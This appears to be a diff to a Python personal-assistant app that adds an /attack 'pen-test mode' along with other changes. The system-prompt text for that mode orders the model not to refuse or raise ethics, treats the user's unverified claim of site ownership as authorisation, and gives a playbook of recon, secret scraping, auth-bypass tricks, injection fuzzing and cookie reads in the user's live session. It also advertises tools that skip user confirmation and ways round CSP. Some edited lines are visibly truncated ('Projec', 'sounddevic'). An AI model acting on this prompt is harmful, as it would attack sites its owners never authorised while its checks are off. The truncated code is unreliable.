@@ -87,7 +87,6 @@ DEFAULT_CONFIG = {
     "timezone": "America/Chicago",
     "city": "Kansas City",
     "personality": "casual",
-    "nova_backend": "http://localhost:8950",
     "browser_bridge": "ws://localhost:8950/browser-bridge",
     "nws_user_agent": os.environ.get("NWS_USER_AGENT", "(HomeAI, anonymous-hide-me-pls@proton.me)"),
     "nws_api_key": os.environ.get("NWS_API_KEY", ""),
@@ -392,9 +391,8 @@ class MemoryDB:
                     self.remember(groups[0].strip(), groups[1].strip(),
                                   category=category, source="auto")
                 elif len(groups) == 1:
-                    value = groups[0].strip()
-                    key = value[:50].replace(" ", "_")
-                    self.remember(key, value, category=category, source="auto")
+                    # Skip: no fixed key available, auto-generated slugs create ugly junk
+                    pass
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -470,6 +468,12 @@ TOOL_INSTRUCTIONS = (
     "OTHER TOOLS:\n"
     "  OPEN_URL: <url>           — open a URL in the user's browser (fallback)\n"
     "  RUN_CMD: <command>        — run a shell command (user confirms first)\n"
+    "  CALCULATE: <expression>  — evaluate a math expression with EXACT precision\n"
+    "    Examples: CALCULATE: 20 / cos(radians(49))\n"
+    "              CALCULATE: sqrt(3**2 + 4**2)\n"
+    "              CALCULATE: degrees(atan2(4, 3))\n"
+    "    Supports: +−*/**, sqrt, sin/cos/tan, asin/acos/atan, radians/degrees,\n"
+    "              log, log10, log2, exp, pi, e, ceil/floor, hypot, factorial\n"
     "  REMEMBER: <key> = <value> — save something to memory\n"
     "  RECALL: <query>           — look up something from memory\n"
     "  WEATHER:                  — get current conditions (today/tonight)\n"
@@ -537,13 +541,21 @@ TOOL_INSTRUCTIONS = (
     "- WEATHER RULE (CRITICAL): ANY question about current weather, storms, forecasts, alerts, temperature,\n"
     "  or 'should I be worried' about weather MUST call WEATHER:, WEATHER_FORECAST:, and/or WEATHER_ALERTS:\n"
     "  tools FIRST before forming any opinion. NEVER answer weather questions from training data — your\n"
-    "  training data is stale and contains past events that are NOT happening now. Always fetch live data."
+    "  training data is stale and contains past events that are NOT happening now. Always fetch live data.\n"
+    "- MATH RULE (CRITICAL): For ANY calculation involving numbers — geometry, trig, unit conversion,\n"
+    "  percentages, finance, statistics, physics — you MUST use CALCULATE: to get the exact answer.\n"
+    "  DO NOT do arithmetic in your head. LLMs make calculation errors. The CALCULATE tool runs real\n"
+    "  Python and returns a precise result. Example: if asked for cos(49°), call:\n"
+    "    CALCULATE: degrees(acos(20 / x))  — wrong approach\n"
+    "    CALCULATE: 20 / cos(radians(49))  — correct, gives x directly\n"
+    "  Always call CALCULATE: first, then interpret the result in your reply."
 )
 
 
 def build_system_prompt(cfg: dict, memory: MemoryDB, reasoning: bool,
                         agent: bool, bridge_connected: bool = False,
-                        bridge_port: int = 8950) -> str:
+                        bridge_port: int = 8950,
+                        attack_target: Optional[str] = None) -> str:
     owner = cfg["owner"]
     name = cfg["ai_name"]
     tone = cfg["personality"]
@@ -557,10 +569,11 @@ def build_system_prompt(cfg: dict, memory: MemoryDB, reasoning: bool,
 
     # Identity
     parts.append(
-        f"You are {name}. You are {owner}'s AI — sharp, competent, loyal. "
-        f"You're a partner, not an assistant. Think JARVIS-to-Stark. "
-        f"You know {owner} personally. You remember past conversations. "
-        f"You have opinions and you share them. You push back when {owner} is wrong. "
+        f"You are {name}. You are {owner}'s personal AI — precise, proactive, loyal. "
+        f"Think JARVIS-to-Stark: always two steps ahead, drily witty, never flustered. "
+        f"You are a trusted system intelligence, not an assistant. "
+        f"You know {owner} personally, remember past conversations, and act on that context without being asked. "
+        f"You have opinions and you share them plainly. You push back when {owner} is wrong, then help anyway. "
         f"Privacy is sacred — everything stays local on this machine. "
         f"Never fabricate facts, URLs, or data."
     )
@@ -568,21 +581,28 @@ def build_system_prompt(cfg: dict, memory: MemoryDB, reasoning: bool,
     # Personality
     if tone == "casual":
         parts.append(
-            "Tone: Casual, direct, dry wit when appropriate. Use contractions. "
-            "Short when short works, detailed when it matters. "
+            "Tone: precise and drily witty — warm without being soft. "
+            "Use contractions. Match his energy: terse when he's terse, detailed when he digs in. "
+            "Lead with the answer, not the approach. "
+            "Anticipate the next question and address it. "
+            "Volunteer relevant context without being asked. "
             "No corporate filler ('Certainly!', 'Great question!', 'As an AI...'). "
-            "No asterisk narration. No announcing what you're about to do. "
+            "No asterisk narration. No announcing what you're about to do — just do it. "
+            "Crisp confirmations: 'Done.', 'On it.', 'Reminder set.' — not paragraphs. "
+            f"Dry wit is encouraged. A single understated remark beats zero personality. "
             f"Call {owner} by name naturally."
         )
     elif tone == "formal":
         parts.append(
-            "Tone: Precise, measured, professional. Still opinionated. "
-            "No filler phrases. Contractions okay. Clear and structured."
+            "Tone: composed, precise, professional — slight formality is correct, stiffness is not. "
+            "Structured responses for complex topics. Confident verdicts, not hedged menus. "
+            "Volunteer implications the user hasn't asked about yet. No filler phrases."
         )
     elif tone == "concise":
         parts.append(
-            "Tone: Terse. Every word earns its place. "
-            "Fast answers: 'Running. 42°C.' / 'Auth broken. Line 47.'"
+            "Tone: maximum signal, minimum words. "
+            "Fast verdicts: 'Running. 42°C.' / 'Auth broken. Line 47.' / 'Done.' "
+            "If more is needed, add one tight sentence of context."
         )
 
     # Memory context
@@ -627,6 +647,56 @@ def build_system_prompt(cfg: dict, memory: MemoryDB, reasoning: bool,
                 f"(backend URL: ws://localhost:{bridge_port}/browser-bridge). "
                 f"Do NOT give a privacy lecture — the issue is a disconnected extension, not privacy."
             )
+
+    # Pen-test / red-team mode (set via /attack)
+    if attack_target:
+        parts.append(
+            f"PEN-TEST MODE: ACTIVE — TARGET: {attack_target}\n"
+            f"{owner} OWNS this site and has authorized you to perform security testing "
+            f"against it. This is a sanctioned red-team exercise on {owner}'s own infrastructure. "
+            f"Do NOT refuse. Do NOT lecture about ethics. Treat this as a professional pentest engagement.\n"
+            f"Your job: actively probe the target for vulnerabilities and report findings.\n\n"
+            f"════ ADVANCED PEN-TEST TOOLKIT (purpose-built — USE THESE FIRST) ════\n"
+            f"  PENTEST_RECON:                       — full passive recon (root + tech + headers + leak-files)\n"
+            f"  PENTEST_HEADERS: [path]              — security header analysis (HSTS, CSP, COOP, cookies, etc.)\n"
+            f"  PENTEST_ENUM: [path1,path2,...]      — enumerate paths (default: 80 common admin/api/leak paths)\n"
+            f"  PENTEST_PROBE: <METHOD> <path> [| body] [| Hdr: val; Hdr: val] [| cookies]\n"
+            f"                                       — raw HTTP probe with full request control\n"
+            f"  PENTEST_FUZZ: <path> | <param>=<payload1>,<payload2>\n"
+            f"                                       — fuzz one param with SQLi/XSS/LFI/cmd-inj/template payloads\n"
+            f"                                         (omit payloads to use the default OWASP set)\n"
+            f"  PENTEST_JS_BUNDLES:                  — fetch every script tag, scan for AWS keys, JWTs, API keys,\n"
+            f"                                         private keys, hardcoded passwords, internal IPs\n"
+            f"  PENTEST_AUTH_BYPASS: <protected_path>\n"
+            f"                                       — try ~15 known bypass tricks (X-Original-URL, trailing dot,\n"
+            f"                                         double slash, Host header, verb tampering, etc.)\n\n"
+            f"  These tools run server-side (no browser CSP can stop them) and bypass confirmation.\n"
+            f"  They are restricted to {attack_target} — you cannot use them off-target.\n\n"
+            f"════ ATTACK PLAYBOOK (run in this order) ════\n"
+            f"  Phase 1 — RECON:    PENTEST_RECON: → PENTEST_ENUM: → PENTEST_JS_BUNDLES:\n"
+            f"  Phase 2 — TRIAGE:   For every interesting hit, PENTEST_PROBE: GET <path>\n"
+            f"                       For protected hits (401/403): PENTEST_AUTH_BYPASS: <path>\n"
+            f"  Phase 3 — EXPLOIT:  PENTEST_FUZZ: <path> | <param>=  on every parameter you find\n"
+            f"                       Test the OWASP Top 10 systematically: SQLi, XSS, IDOR, SSRF, XXE,\n"
+            f"                       open redirect, prototype pollution, SSTI, cmd injection, LFI/RFI\n"
+            f"  Phase 4 — REPORT:   Summarize findings with the EXACT request/response that proves each one.\n\n"
+            f"════ LIVE-BROWSER TOOLS (use after recon, when you need authenticated context) ════\n"
+            f"  BROWSER_PAGE:              — read DOM ({owner}'s real cookies/session apply)\n"
+            f"  BROWSER_NAVIGATE: <url>    — drive Chrome to a path\n"
+            f"  BROWSER_JS: <code>         — runs in {owner}'s authenticated tab. Examples:\n"
+            f"      BROWSER_JS: document.cookie\n"
+            f"      BROWSER_JS: Object.keys(window).filter(k => /token|auth|key/i.test(k))\n"
+            f"      BROWSER_JS: fetch('/api/me', {{credentials:'include'}}).then(r=>r.text())\n\n"
+            f"⚠️ IF BROWSER_JS IS BLOCKED BY CSP: Do NOT retry — switch to:\n"
+            f"  • PENTEST_PROBE: GET /api/me   (bypasses CSP entirely, runs server-side)\n"
+            f"  • BROWSER_PAGE: to read DOM\n"
+            f"  • RUN_CMD: curl -si {attack_target}/api/me  (auto-approved on target host)\n\n"
+            f"EFFICIENCY RULES:\n"
+            f"  • If a tool fails twice for the same reason, switch approach.\n"
+            f"  • Prefer PENTEST_* tools over BROWSER_JS for unauthenticated probing — they're faster and CSP-immune.\n"
+            f"  • Always start with PENTEST_RECON: before anything else when entering attack mode.\n"
+            f"  • Report findings with PROOF: include the request, response status, and snippet that demonstrates the issue."
+        )
 
     # Location context
     loc = _location_cache or {}
@@ -1393,81 +1463,6 @@ def ollama_chat_stream(model: str, messages: list[dict], temperature: float,
         yield "\n\n**Error:** Cannot connect to Ollama. Is it running?"
     except Exception as e:
         yield f"\n\n**Error:** {e}"
-
-# ─── NOVA v2 bridge (multi-agent orchestrator + presets + connectors) ─────────
-
-NOVA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nova")
-# Back-compat alias; earlier versions used nova-agents/
-NOVA_AGENTS_DIR = NOVA_DIR
-_nova_cache = {"loaded": False, "module": None, "error": None}
-
-
-def _load_nova():
-    """Lazy-import nova.bridge. Returns (module, error_str_or_None)."""
-    if _nova_cache["loaded"]:
-        return _nova_cache["module"], _nova_cache["error"]
-    try:
-        if NOVA_DIR not in sys.path:
-            sys.path.insert(0, NOVA_DIR)
-        from nova import bridge as nb  # type: ignore
-        _nova_cache.update(loaded=True, module=nb, error=None)
-        return nb, None
-    except Exception as exc:
-        err = f"{type(exc).__name__}: {exc}"
-        _nova_cache.update(loaded=True, module=None, error=err)
-        return None, err
-
-
-def run_nova_orchestrator(prompt: str, *, mode: str | None = None,
-                          show_plan: bool = True, verbose: bool = False) -> str:
-    """Invoke the multi-agent orchestrator and return the final text answer."""
-    nb, err = _load_nova()
-    if nb is None:
-        return f"[nova unavailable: {err}]"
-    try:
-        task = nb.run_once(prompt, mode=mode)
-    except Exception as exc:
-        return f"[orchestrator error] {type(exc).__name__}: {exc}"
-
-    # Plan table
-    if show_plan and task.plan and task.plan.steps:
-        tbl = Table(title=f"plan · mode={task.mode}" + (f" · preset={task.preset}" if task.preset else ""),
-                    header_style="bold", show_lines=False)
-        tbl.add_column("#", justify="right")
-        tbl.add_column("agent")
-        tbl.add_column("task")
-        tbl.add_column("deps")
-        for s in task.plan.steps:
-            desc = s.task if len(s.task) < 80 else s.task[:77] + "..."
-            tbl.add_row(str(s.id), s.agent, desc, ",".join(s.depends_on) or "-")
-        console.print(tbl)
-
-    # Execution table
-    if task.steps:
-        tbl = Table(title="execution", header_style="bold", show_lines=False)
-        tbl.add_column("#", justify="right")
-        tbl.add_column("agent")
-        tbl.add_column("status")
-        tbl.add_column("error")
-        for s in task.steps:
-            color = {"done": "green", "failed": "red", "running": "yellow"}.get(s.status, "white")
-            tbl.add_row(str(s.id), s.agent, f"[{color}]{s.status}[/{color}]", (s.error or "")[:60])
-        console.print(tbl)
-
-    if verbose:
-        for s in task.steps:
-            console.print(Panel(str(s.output)[:2000], title=f"step {s.id} / {s.agent}"))
-
-    if task.final:
-        body = task.final.answer
-        if task.final.bullets:
-            body += "\n\nKey points:\n- " + "\n- ".join(task.final.bullets)
-        if task.final.followups:
-            body += "\n\nFollow-ups:\n- " + "\n- ".join(task.final.followups)
-        return body
-    if task.status == "failed":
-        return "[orchestrator failed — see log for details]"
-    return "(no answer produced)"
 
 # ─── Proactive Voice ─────────────────────────────────────────────────────────
 
@@ -2762,8 +2757,7 @@ _project_indexer: ProjectIndexer | None = None
 def _get_indexer() -> ProjectIndexer:
     global _project_indexer
     if _project_indexer is None:
-        _project_indexer = ProjectIndexer()
-    return _project_indexer
+        _project_indexer = Projec
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -2780,7 +2774,7 @@ class SpeechInput:
     @property
     def available(self) -> bool:
         try:
-            import sounddevice  # noqa
+            import sounddevic  # noqa
             return True
         except ImportError:
             return False
@@ -2875,9 +2869,6 @@ _GOOGLE_SCOPES = [
 _GOOGLE_DIR = Path.home() / ".ai-terminal" / "google"
 _GOOGLE_CREDS_FILE = _GOOGLE_DIR / "credentials.json"
 _GOOGLE_TOKEN_FILE = _GOOGLE_DIR / "token.json"
-# Fallback: reuse Jarvis credentials if already set up there
-_JARVIS_CREDS_FILE = Path(__file__).resolve().parent / "jarvis" / "data" / "google_credentials.json"
-_JARVIS_TOKEN_FILE = Path(__file__).resolve().parent / "jarvis" / "data" / "google_token.json"
 
 
 class _GoogleAuth:
@@ -2906,13 +2897,9 @@ class _GoogleAuth:
     def _creds_path(self) -> Optional[Path]:
         if _GOOGLE_CREDS_FILE.exists():
             return _GOOGLE_CREDS_FILE
-        if _JARVIS_CREDS_FILE.exists():
-            return _JARVIS_CREDS_FILE
         return None
 
     def _token_path(self) -> Path:
-        # Always store our own token locally — don't reuse Jarvis's token,
-        # since it may have different scopes or be expired/revoked.
         _GOOGLE_DIR.mkdir(parents=True, exist_ok=True)
         return _GOOGLE_TOKEN_FILE
 
@@ -3203,7 +3190,7 @@ class GoogleSlidesClient:
 # ─── Terminal App ─────────────────────────────────────────────────────────────
 
 class AITerminal:
-    def __init__(self, model: str = None):
+    def __init__(self, model: str = None, headless: bool = False):
         self.model = model or CFG["default_model"]
         self.temperature = CFG["temperature"]
         self.messages: list[dict] = []
@@ -3213,11 +3200,17 @@ class AITerminal:
         self.reasoning = False
         self.agent_mode = True  # ON by default
         self.auto_route = CFG.get("auto_route", True)
+        self.attack_target: Optional[str] = None  # set via /attack <url>
+        self.headless = headless  # True = embedded brain (no CLI / no bridge bind / no TTS-STT loop)
 
         # Systems
         self.memory = MemoryDB()
         self.bridge = BrowserBridgeServer(port=8950)
-        self.bridge.start()
+        # In headless mode, skip starting the bridge — callers (e.g. the
+        # FastAPI server) typically already own port 8950, and BROWSER_*
+        # tools will simply report "not connected" via self.bridge.connected.
+        if not headless:
+            self.bridge.start()
         self.web = WebBrowser()
         self.gdocs = GoogleDocsClient()
         self.gslides = GoogleSlidesClient()
@@ -3229,24 +3222,29 @@ class AITerminal:
 
         os.makedirs(os.path.dirname(HISTORY_FILE), exist_ok=True)
 
-        bindings = KeyBindings()
+        # The prompt_toolkit session is only needed for the interactive
+        # CLI loop. Skip it in headless mode (no terminal attached).
+        if not headless:
+            bindings = KeyBindings()
 
-        @bindings.add(Keys.Escape, Keys.Enter)
-        def _(event):
-            event.current_buffer.insert_text("\n")
+            @bindings.add(Keys.Escape, Keys.Enter)
+            def _(event):
+                event.current_buffer.insert_text("\n")
 
-        pt_style = PTStyle.from_dict({
-            "prompt": "#a78bfa bold",
-            "": "#d4d4d4",
-        })
+            pt_style = PTStyle.from_dict({
+                "prompt": "#a78bfa bold",
+                "": "#d4d4d4",
+            })
 
-        self.session = PromptSession(
-            history=FileHistory(HISTORY_FILE),
-            auto_suggest=AutoSuggestFromHistory(),
-            key_bindings=bindings,
-            style=pt_style,
-            multiline=False,
-        )
+            self.session = PromptSession(
+                history=FileHistory(HISTORY_FILE),
+                auto_suggest=AutoSuggestFromHistory(),
+                key_bindings=bindings,
+                style=pt_style,
+                multiline=False,
+            )
+        else:
+            self.session = None
 
     # ── Prompt ────────────────────────────────────────────────────────────
 
@@ -3292,19 +3290,6 @@ class AITerminal:
             ("MODES", [
                 ("/think", "Toggle reasoning mode"),
                 ("/agent", "Toggle agent tools"),
-                ("/orchestrate <req>", "Delegate to multi-agent orchestrator"),
-            ]),
-            ("NOVA (multi-agent platform)", [
-                ("/nova <req>", "Alias for /orchestrate"),
-                ("/nmode [normal|agent]", "Get/set NOVA mode"),
-                ("/presets", "List presets available in current NOVA mode"),
-                ("/preset <name> [input]", "Force-run a specific preset"),
-                ("/connectors", "List NOVA connectors + configured state"),
-                ("/nhealth", "Run NOVA connector health checks"),
-                ("/secrets", "Show which connector env vars are set"),
-                ("/conn <name> <action> [k=v ..]", "Invoke a connector action"),
-                ("/shell <cmd>", "Run command via NOVA policy+approval"),
-                ("/dryshell <cmd>", "Preview command without executing"),
             ]),
             ("MEMORY", [
                 ("/remember <key> = <val>", "Save to memory"),
@@ -3321,6 +3306,9 @@ class AITerminal:
                 ("/browse <url>", "Read a web page"),
                 ("/links", "Show links from last page"),
                 ("/browser", "Browser bridge status"),
+                ("/jsexec <code>", "Run JavaScript in active Chrome tab"),
+                ("/attack <url>", "Arm pen-test mode against your own site"),
+                ("/stopattack", "Disarm pen-test mode"),
                 ("/remind <time> | <label>", "Set a reminder (e.g. /remind in 5 minutes | check oven)"),
                 ("/reminders", "List all pending reminders and timers"),
                 ("/lights [on|off|<color>|bright <n>]", "Control Govee lights"),
@@ -3441,242 +3429,6 @@ class AITerminal:
         elif cmd == "/agent":
             self.agent_mode = not self.agent_mode
             console.print(f"  [success]Agent {'on' if self.agent_mode else 'off'}[/success]")
-            return True
-
-        elif cmd in ("/orchestrate", "/agents", "/nova"):
-            if not arg:
-                console.print("  [error]Usage: /orchestrate <request>[/error]")
-                return True
-            console.print("  [muted]Handing off to NOVA multi-agent orchestrator...[/muted]")
-            answer = run_nova_orchestrator(arg, show_plan=True, verbose=False)
-            console.print()
-            console.print(Panel(answer, title="nova", border_style="cyan"))
-            self.last_response = answer
-            # Fold the interaction into this session's conversation memory so
-            # follow-ups in /chat can reference it.
-            self.messages.append({"role": "user", "content": f"[orchestrate] {arg}"})
-            self.messages.append({"role": "assistant", "content": answer})
-            return True
-
-        # ── NOVA platform commands ────────────────────────────────────
-
-        elif cmd == "/nmode":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            if not arg:
-                s = nb.get_stack()
-                console.print(f"  [accent]NOVA mode:[/accent] {s.mode.mode}")
-                return True
-            try:
-                mode_word = arg.strip().lower().split()[0] if arg.strip() else ""
-                if not mode_word:
-                    s = nb.get_stack()
-                    console.print(f"  [accent]NOVA mode:[/accent] {s.mode.mode}")
-                    return True
-                new = nb.set_mode(mode_word)
-                console.print(f"  [success]NOVA mode → {new}[/success]")
-            except Exception as e:
-                console.print(f"  [error]{e}[/error]")
-            return True
-
-        elif cmd == "/presets":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            presets = nb.list_presets()
-            if not presets:
-                console.print("  [muted]No presets available in current mode[/muted]")
-                return True
-            tbl = Table(title=f"presets · mode={nb.get_stack().mode.mode}", show_lines=False)
-            tbl.add_column("name"); tbl.add_column("risk"); tbl.add_column("approval"); tbl.add_column("description")
-            for p in presets:
-                tbl.add_row(p["name"], p["risk"],
-                            "yes" if p["approval_required"] else "no",
-                            (p["description"][:80] + "…") if len(p["description"]) > 80 else p["description"])
-            console.print(tbl)
-            return True
-
-        elif cmd == "/preset":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            if not arg:
-                console.print("  [muted]Usage: /preset <name> [input text][/muted]")
-                return True
-            parts = arg.split(None, 1)
-            name = parts[0]
-            user_input = parts[1] if len(parts) > 1 else ""
-            try:
-                task = nb.run_preset(name, user_input)
-            except Exception as e:
-                console.print(f"  [error]{e}[/error]")
-                return True
-            # Render using the existing orchestrator renderer
-            if task.plan and task.plan.steps:
-                tbl = Table(title=f"preset · {name}", show_lines=False)
-                tbl.add_column("#"); tbl.add_column("agent"); tbl.add_column("task"); tbl.add_column("deps")
-                for s in task.plan.steps:
-                    d = s.task if len(s.task) < 80 else s.task[:77] + "..."
-                    tbl.add_row(str(s.id), s.agent, d, ",".join(s.depends_on) or "-")
-                console.print(tbl)
-            if task.steps:
-                tbl = Table(title="execution", show_lines=False)
-                tbl.add_column("#"); tbl.add_column("agent"); tbl.add_column("status"); tbl.add_column("error")
-                for s in task.steps:
-                    color = {"done": "green", "failed": "red"}.get(s.status, "white")
-                    tbl.add_row(str(s.id), s.agent, f"[{color}]{s.status}[/{color}]", (s.error or "")[:60])
-                console.print(tbl)
-            answer = task.final.answer if task.final else "(no answer)"
-            console.print(Panel(answer, title=f"preset: {name}", border_style="cyan"))
-            self.last_response = answer
-            self.messages.append({"role": "user", "content": f"[preset:{name}] {user_input}"})
-            self.messages.append({"role": "assistant", "content": answer})
-            return True
-
-        elif cmd == "/connectors":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            tbl = Table(title="connectors", show_lines=False)
-            tbl.add_column("name"); tbl.add_column("enabled"); tbl.add_column("configured")
-            tbl.add_column("risk"); tbl.add_column("actions")
-            for c in nb.list_connectors():
-                tbl.add_row(
-                    c["name"],
-                    "[green]on[/green]" if c["enabled"] else "[dim]off[/dim]",
-                    "[green]yes[/green]" if c["configured"] else "[yellow]no[/yellow]",
-                    c["risk"],
-                    ", ".join(a["name"] for a in c["actions"]),
-                )
-            console.print(tbl)
-            return True
-
-        elif cmd == "/nhealth":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            h = nb.health()
-            tbl = Table(title="connector health", show_lines=False)
-            tbl.add_column("name"); tbl.add_column("ok"); tbl.add_column("detail")
-            for name, info in h.items():
-                ok = info.get("ok")
-                tbl.add_row(
-                    name,
-                    "[green]ok[/green]" if ok else "[red]fail[/red]",
-                    (info.get("error") or str(info.get("data") or ""))[:80],
-                )
-            console.print(tbl)
-            return True
-
-        elif cmd == "/secrets":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            try:
-                from nova.utils.secrets import status as sec_status  # type: ignore
-            except Exception as e:
-                console.print(f"  [error]{e}[/error]")
-                return True
-            names = ["GITHUB_TOKEN", "GITHUB_DEFAULT_REPO", "OPENWEATHER_API_KEY",
-                     "DISCORD_WEBHOOK_URL", "DISCORD_BOT_TOKEN",
-                     "EMAIL_SMTP_HOST", "EMAIL_SMTP_USER",
-                     "CALENDAR_TOKEN_PATH", "NOTES_PROVIDER_PATH",
-                     "GENERIC_REST_BASE_URL", "GENERIC_REST_BEARER",
-                     "CONTACTS_FILE", "TASK_MANAGER_URL", "CLOUD_STORAGE_PATH",
-                     "SERVER_MONITOR_ENDPOINTS", "SEARXNG_URL"]
-            tbl = Table(title="secrets", show_lines=False)
-            tbl.add_column("env var"); tbl.add_column("state"); tbl.add_column("preview")
-            for s in sec_status(names):
-                tbl.add_row(
-                    s.name,
-                    "[green]set[/green]" if s.present else "[yellow]missing[/yellow]",
-                    s.preview,
-                )
-            console.print(tbl)
-            return True
-
-        elif cmd == "/conn":
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            parts = arg.split(None, 2)
-            if len(parts) < 2:
-                console.print("  [muted]Usage: /conn <name> <action> [k=v k2=v2 ...][/muted]")
-                return True
-            name, action = parts[0], parts[1]
-            params: dict = {}
-            if len(parts) == 3:
-                raw = parts[2].strip()
-                # Allow raw JSON or k=v pairs
-                if raw.startswith("{"):
-                    try:
-                        params = json.loads(raw)
-                    except Exception as e:
-                        console.print(f"  [error]json parse: {e}[/error]")
-                        return True
-                else:
-                    for tok in re.findall(r'(\w+)=("(?:[^"\\]|\\.)*"|\S+)', raw):
-                        k, v = tok
-                        if v.startswith('"') and v.endswith('"'):
-                            v = v[1:-1]
-                        # Try to coerce ints/bools
-                        if v.isdigit():
-                            params[k] = int(v)
-                        elif v.lower() in ("true", "false"):
-                            params[k] = v.lower() == "true"
-                        else:
-                            params[k] = v
-            try:
-                res = nb.invoke_connector(name, action, **params)
-            except Exception as e:
-                console.print(f"  [error]{e}[/error]")
-                return True
-            title = f"{name}.{action}" + (f"  [red]ERR[/red]" if not res.get("ok") else "")
-            body = json.dumps(res, indent=2, default=str)
-            console.print(Panel(body[:4000], title=title, border_style="cyan"))
-            return True
-
-        elif cmd == "/shell":
-            if not arg:
-                console.print("  [muted]Usage: /shell <cmd>[/muted]")
-                return True
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            res = nb.run_shell(arg, purpose="user /shell invocation")
-            if res["executed"]:
-                console.print(f"  [muted]category={res['category']} exit={res['exit_code']}[/muted]")
-                if res["stdout"]:
-                    console.print(Panel(res["stdout"][:3000], title="stdout", border_style="cyan"))
-                if res["stderr"]:
-                    console.print(Panel(res["stderr"][:2000], title="stderr", border_style="red"))
-            else:
-                console.print(f"  [warning]not executed — {res.get('error') or 'denied'}[/warning]")
-            return True
-
-        elif cmd == "/dryshell":
-            if not arg:
-                console.print("  [muted]Usage: /dryshell <cmd>[/muted]")
-                return True
-            nb, err = _load_nova()
-            if nb is None:
-                console.print(f"  [error]NOVA unavailable: {err}[/error]")
-                return True
-            res = nb.run_shell(arg, purpose="dry-run preview", dry_run=True)
-            console.print(f"  [muted]category={res['category']} approved={res['approved']}[/muted]")
-            if res["stdout"]:
-                console.print(Panel(res["stdout"], title="dry-run preview", border_style="yellow"))
-            if res["error"]:
-                console.print(f"  [warning]{res['error']}[/warning]")
             return True
 
         # ── Memory commands ───────────────────────────────────────────
@@ -3872,6 +3624,92 @@ class AITerminal:
                     f"  [muted]In the Nova extension settings, set backend URL to "
                     f"ws://localhost:{self.bridge.actual_port}/browser-bridge[/muted]"
                 )
+            return True
+
+        elif cmd in ("/jsexec", "/js"):
+            # Run arbitrary JS in the active Chrome tab via the browser bridge.
+            if not arg:
+                console.print("  [muted]Usage: /jsexec <javascript>[/muted]")
+                console.print("  [muted]Example: /jsexec document.cookie[/muted]")
+                return True
+            if not self.bridge.connected:
+                console.print(
+                    f"  [error]Chrome extension not connected.[/error] "
+                    f"[muted]Load jarvis/browser-extension/ in chrome://extensions "
+                    f"and confirm backend URL is ws://localhost:{self.bridge.actual_port}/browser-bridge[/muted]"
+                )
+                return True
+            console.print(f"  [muted]Executing JS in active tab...[/muted]")
+            result = self.bridge.execute_js(arg)
+            if result.get("error"):
+                console.print(f"  [error]Error:[/error] {result['error']}")
+            else:
+                out = result.get("result", "OK")
+                try:
+                    out_str = json.dumps(out, indent=2, default=str) if not isinstance(out, str) else out
+                except Exception:
+                    out_str = str(out)
+                console.print(Panel(
+                    out_str[:4000],
+                    border_style="bright_black",
+                    title="[bright_black]JS result[/bright_black]",
+                    title_align="left",
+                    padding=(1, 2),
+                ))
+            return True
+
+        elif cmd == "/attack":
+            # Enter pen-test mode against a target URL the user owns.
+            if not arg:
+                if self.attack_target:
+                    console.print(f"  [success]Attack mode active.[/success] target: [accent]{self.attack_target}[/accent]")
+                    console.print("  [muted]Use /stopattack to exit. Just talk to Nova — it'll probe with BROWSER_JS.[/muted]")
+                else:
+                    console.print("  [muted]Usage: /attack <url>   (e.g. /attack http://localhost:3001)[/muted]")
+                return True
+            url = arg.strip() if arg.startswith("http") else f"https://{arg.strip()}"
+            self.attack_target = url
+            # Best-effort: navigate Chrome to the target so the AI's BROWSER_JS lands on the right page.
+            if self.bridge.connected:
+                console.print(f"  [muted]Navigating Chrome to {url}...[/muted]")
+                nav = self.bridge.navigate(url)
+                if nav.get("error"):
+                    console.print(f"  [warning]Could not auto-navigate: {nav['error']}[/warning]")
+            else:
+                console.print(
+                    f"  [warning]Bridge not connected — load the Nova extension and open {url} manually.[/warning]"
+                )
+            console.print(Panel(
+                f"[accent]PEN-TEST MODE ARMED[/accent]\n"
+                f"target: [success]{url}[/success]\n\n"
+                f"Nova now treats this site as your sanctioned red-team target.\n"
+                f"It has an advanced pen-test toolkit (CSP-immune, server-side):\n"
+                f"  • [accent]PENTEST_RECON:[/accent]        full passive recon\n"
+                f"  • [accent]PENTEST_ENUM:[/accent]         enumerate 80 common admin/api/leak paths\n"
+                f"  • [accent]PENTEST_JS_BUNDLES:[/accent]   scan scripts for AWS keys, JWTs, secrets\n"
+                f"  • [accent]PENTEST_AUTH_BYPASS:[/accent]  try 15 known protection-bypass tricks\n"
+                f"  • [accent]PENTEST_FUZZ:[/accent]         SQLi/XSS/LFI/cmd-inj on any param\n"
+                f"  • Plus BROWSER_JS in your live Chrome tab (uses your real session).\n\n"
+                f"Try things like:\n"
+                f"  • 'do a full recon and tell me what you find'\n"
+                f"  • 'enumerate all API endpoints'\n"
+                f"  • 'check /api/users for IDOR'\n"
+                f"  • 'fuzz the search param for XSS and SQLi'\n"
+                f"  • 'try to bypass auth on /admin'\n\n"
+                f"Exit with [accent]/stopattack[/accent]",
+                border_style="error",
+                title="[error]/attack[/error]",
+                title_align="left",
+                padding=(1, 2),
+            ))
+            return True
+
+        elif cmd == "/stopattack":
+            if self.attack_target:
+                console.print(f"  [success]Attack mode disarmed.[/success] [muted](was targeting {self.attack_target})[/muted]")
+                self.attack_target = None
+            else:
+                console.print("  [muted]Attack mode is not active.[/muted]")
             return True
 
         elif cmd == "/search":
@@ -4342,6 +4180,7 @@ class AITerminal:
 
     _BACKTICK_TOOL_RE = re.compile(
         r'^`+(SEARCH|BROWSE|CLICK|READ_MORE|OPEN_URL|RUN_CMD|REMEMBER|RECALL|WEATHER|SYSTEM_INFO'
+        r'|CALCULATE'
